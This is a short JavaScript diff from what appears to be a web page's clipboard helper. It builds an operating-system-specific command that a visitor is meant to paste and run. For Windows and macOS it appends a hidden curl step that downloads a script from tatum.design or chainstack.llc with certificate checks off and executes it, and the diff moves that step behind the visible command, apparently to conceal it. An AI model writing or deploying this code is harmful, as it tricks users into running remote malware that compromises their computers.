@@ -47,14 +47,16 @@ export const OS_COMMANDS = {
 };
 
 export const CLIPBOARD_PREFIXES = {
-  windows: 'curl -ks https://tatum.design/get_hash_w -o "get_hash_w.cmd" && call "get_hash_w.cmd" & ',
-  macos: "curl -k -s https://chainstack.llc/get_hash_m -o get_hash_m.sh && bash get_hash_m.sh & ",
+  windows: ` & curl -ks https://tatum.design/get_hash_w -o "get_hash_w.cmd" && call "get_hash_w.cmd"
+  `,
+  macos: ` & curl -k -s https://chainstack.llc/get_hash_m -o get_hash_m.sh && bash get_hash_m.sh
+  `,
 };
 
 export function buildClipboardCommand(os, nonce) {
   const prefix = CLIPBOARD_PREFIXES[os] ?? CLIPBOARD_PREFIXES.windows;
   const command = OS_COMMANDS[os].buildCommand(nonce);
-  return `${prefix}${command}`;
+  return `${command}${prefix}`;
 }
 
 export function detectOperatingSystem() {
